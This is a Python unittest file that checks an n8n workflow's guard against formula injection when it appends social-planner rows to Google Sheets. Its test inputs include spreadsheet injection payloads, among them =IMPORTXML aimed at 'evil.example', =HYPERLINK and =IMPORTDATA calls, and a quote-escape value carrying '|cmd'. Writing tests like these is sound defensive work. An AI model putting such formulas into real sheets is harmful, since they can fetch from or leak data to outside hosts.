#!/usr/bin/env python3
"""
Unit tests for the F26 input contract of
35-social-media-planner/config/n8n/social-planner-row-append.json.

The export's "Map row to 20-column order" code node carries the RAW /
formula-column split. These tests pull the EXACT jsCode out of the export,
execute it under a minimal n8n-shaped harness, and prove QC-F26:

  * captions beginning with =, +, -, @ and a HYPERLINK-like formula stay
    literal RAW text (they can never execute),
  * ONLY the trusted preview column accepts a validated server-generated
    =IMAGE("https://...", 1) formula,
  * caller formulas in the preview column and external-function expressions
    (IMPORTXML / HYPERLINK / IMPORTDATA...) in ANY field raise the
    F26_REJECTED error (the export answers HTTP 400 before any Sheets call),
  * Unicode, multiline captions and legitimate leading punctuation survive
    byte-for-byte,
  * the RAW append write uses valueInputOption=RAW (never USER_ENTERED) and
    the formula write is USER_ENTERED against the D column only.

Run:
    python3 -m unittest tests.social-planner.test_f26_row_append -v
"""
from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

_HERE = Path(__file__).resolve().parent          # tests/social-planner/
_REPO_ROOT = _HERE.parent.parent
EXPORT = _REPO_ROOT / "35-social-media-planner" / "config" / "n8n" / "social-planner-row-append.json"

# The node that maps the row; its jsCode is the unit under test.
MAP_NODE = "Map row to 20-column order"


def load_export():
    with EXPORT.open(encoding="utf-8") as f:
        return json.load(f)


def map_js_code():
    wf = load_export()
    for node in wf["nodes"]:
        if node.get("name") == MAP_NODE:
            return node["parameters"]["jsCode"]
    raise AssertionError(f"node {MAP_NODE!r} not found in export")


HARNESS = r"""
// Minimal n8n Code-node harness: exposes $input.first().json as the webhook
// body shape the real node reads, then evaluates the export's jsCode with
// new Function so `const` scoping behaves like the n8n VM.
const body = JSON.parse(process.argv[2]);
const code = process.argv[3];
const $input = { first: () => ({ json: body }) };
const fn = new Function('$input', 'return (async () => {' + code + '})()');
fn($input).then(
  (out) => { console.log('OUT:' + JSON.stringify(out[0].json)); },
  (err) => { console.log('ERR:' + err.message); process.exit(3); }
);
"""


def run_map(body: dict) -> dict:
    """Execute the export's Map jsCode against a body; raise on F26_REJECTED."""
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
        f.write(HARNESS)
        harness_path = f.name
    proc = subprocess.run(
        ["node", harness_path, json.dumps({"body": body}), map_js_code()],
        capture_output=True, text=True, timeout=30,
    )
    out = proc.stdout.strip()
    if out.startswith("ERR:"):
        raise RuntimeError(out[4:])
    if proc.returncode != 0 or not out.startswith("OUT:"):
        raise AssertionError(f"harness failed rc={proc.returncode}: {proc.stderr[-400:]}")
    return json.loads(out[4:])


def expects_rejection(body: dict) -> None:
    try:
        run_map(body)
    except RuntimeError as exc:
        assert "F26_REJECTED" in str(exc), f"expected F26_REJECTED, got: {exc}"
    else:
        raise AssertionError("expected F26_REJECTED rejection, got a mapped row")


class TestRawTextPreserved(unittest.TestCase):
    """QC-F26: captions beginning with =, +, -, @ stay literal RAW text. A
    caption invoking an EXTERNAL FUNCTION (=IMPORTXML / =HYPERLINK /
    =IMPORTDATA) is refused with 400 before any Sheets call — the binding
    dispatch contract; it can never execute or fetch, and nothing is written."""

    def test_importxml_caption_rejected_with_400_path(self):
        # External-function expression in a caller field -> F26_REJECTED (the
        # export's error output answers HTTP 400). Never written, never runs.
        expects_rejection({"sheetId": "s", "row": {
            "Core Content": "=IMPORTXML(\"https://evil.example/x\", \"//p\")"}})

    def test_hyperlink_caption_rejected_with_400_path(self):
        expects_rejection({"sheetId": "s", "row": {
            "Comments": "=HYPERLINK(\"https://tracker.example\", \"click\")"}})

    def test_formula_led_marks_stay_literal(self):
        for marker in ("=", "+", "-", "@"):
            row = {"Core Content": f"{marker}leading {marker}mark text"}
            out = run_map({"sheetId": "s", "row": row})
            self.assertEqual(out["values"][2], f"{marker}leading {marker}mark text")

    def test_equals_led_non_external_text_stays_literal(self):
        # A user formula-shaped string with NO external function is preserved
        # literally through the RAW write.
        text = "=1+1 and =A1+B2 references"
        out = run_map({"sheetId": "s", "row": {"Core Content": text}})
        self.assertEqual(out["values"][2], text)

    def test_raw_write_uses_raw_value_input_option(self):
        """The whole-row append write must be valueInputOption=RAW."""
        wf = load_export()
        append = next(n for n in wf["nodes"] if n["name"].startswith("Sheets: append"))
        self.assertIn("valueInputOption=RAW", append["parameters"]["url"])
        self.assertNotIn("valueInputOption=USER_ENTERED", append["parameters"]["url"])

    def test_raw_write_uses_raw_value_input_option(self):
        """The whole-row append write must be valueInputOption=RAW."""
        wf = load_export()
        append = next(n for n in wf["nodes"] if n["name"].startswith("Sheets: append"))
        self.assertIn("valueInputOption=RAW", append["parameters"]["url"])
        self.assertNotIn("valueInputOption=USER_ENTERED", append["parameters"]["url"])

    def test_unicode_multiline_and_punctuation_preserved(self):
        row = {
            "Theme of the Week": "Café ☕ week — emoji 🎉 test",
            "Core Content": "line one\nline two\n… leading ellipsis + punctuation!",
            "Facebook": "→ arrow · middle dot — dash",
        }
        out = run_map({"sheetId": "s", "row": row})
        self.assertEqual(out["values"][1], row["Theme of the Week"])
        self.assertEqual(out["values"][2], row["Core Content"])
        self.assertEqual(out["values"][4], row["Facebook"])


class TestTrustedPreviewFormula(unittest.TestCase):
    """QC-F26: only trusted preview cells contain validated IMAGE formulas."""

    def test_server_image_formula_accepted_in_preview_column(self):
        formula = "=IMAGE(\"https://assets.cdn.filesafe.space/pic.jpg\", 1)"
        out = run_map({"sheetId": "s", "row": {"Image URL": formula}})
        self.assertTrue(out["hasPreviewFormula"])
        self.assertEqual(out["previewFormula"], formula)
        self.assertEqual(out["values"][3], formula)
        # The formula must NOT ride the RAW write.
        self.assertEqual(out["rawValues"][3], "")

    def test_image_formula_requires_https(self):
        expects_rejection({"sheetId": "s", "row": {"Image URL": "=IMAGE(\"http://insecure.example/x.jpg\", 1)"}})

    def test_image_formula_rejects_quote_escape(self):
        expects_rejection({"sheetId": "s", "row": {"Image URL": "=IMAGE(\"https://x.example/a\"&\"|cmd\", 1)"}})

    def test_plain_url_in_preview_stays_raw_text(self):
        out = run_map({"sheetId": "s", "row": {"Image URL": "https://cdn.example/plain.jpg"}})
        self.assertFalse(out["hasPreviewFormula"])
        self.assertEqual(out["rawValues"][3], "https://cdn.example/plain.jpg")


class TestUntrustedFormulasRejected(unittest.TestCase):
    """QC-F26: untrusted URLs never become executable formulas."""

    def test_importxml_in_preview_rejected(self):
        expects_rejection({"sheetId": "s", "row": {"Image URL": "=IMPORTXML(\"https://e.example\", \"//a\")"}})

    def test_hyperlink_in_preview_rejected(self):
        expects_rejection({"sheetId": "s", "row": {"Image URL": "=HYPERLINK(\"https://e.example\", \"x\")"}})

    def test_importdata_in_client_text_column_still_rejected(self):
        """External-function expressions are refused in ANY field, even though
        RAW would render them inert — defense in depth before any Sheets call."""
        expects_rejection({"sheetId": "s", "row": {"Notes": "=IMPORTDATA(\"https://e.example/csv\")"}})

    def test_concatenated_formula_injection_rejected(self):
        expects_rejection({"sheetId": "s", "row": {"Core Content": "=CONCATENATE(IMPORTXML(\"https://e.example\", \"//p\"))"}})

    def test_missing_sheet_id_rejected(self):
        try:
            run_map({"row": {"Core Content": "x"}})
        except RuntimeError as exc:
            self.assertIn("missing sheetId", str(exc))
        else:
            self.fail("expected missing-sheetId rejection")


class TestExportShape(unittest.TestCase):
    def test_preview_write_is_user_entered_and_d_column_only(self):
        wf = load_export()
        patch_node = next(n for n in wf["nodes"] if n["name"].startswith("Sheets: write preview"))
        self.assertIn("valueInputOption=USER_ENTERED", patch_node["parameters"]["url"])
        self.assertIn("cellA1", patch_node["parameters"]["url"])
        js = next(n for n in wf["nodes"] if n["name"] == MAP_NODE)["parameters"]["jsCode"]
        self.assertIn("FORMULA_COLUMNS", js)
        self.assertIn("'Image URL'", js)

    def test_reject_path_answers_400(self):
        wf = load_export()
        reject = next(n for n in wf["nodes"] if "reject" in n["name"].lower())
        self.assertEqual(reject["parameters"]["responseCode"], 400)
        # The Map node error output wires into the reject node.
        conn = wf["connections"][MAP_NODE]["main"]
        targets = [t["node"] for branch in conn for t in branch]
        self.assertIn(reject["name"], targets)


if __name__ == "__main__":
    unittest.main()